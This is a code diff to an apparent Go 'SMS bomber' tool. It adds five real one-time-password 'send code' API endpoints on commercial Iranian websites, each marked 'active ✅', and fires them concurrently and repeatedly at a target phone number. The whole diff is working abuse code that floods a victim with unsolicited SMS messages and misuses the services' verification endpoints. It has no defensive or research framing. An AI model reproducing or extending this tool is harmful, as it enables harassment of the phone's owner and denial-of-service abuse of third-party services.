@@ -205,6 +205,18 @@ func main() {
 		go sms("https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
 			"mobile": phone,
 		}, ch) //active ✅
+		go sms("https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
+			"phone_number": phone,
+		}, ch) // active ✅
+		go sms("https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  //active ✅
+		go sms("https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // active ✅ 
+		go sms("https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // active ✅
 
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
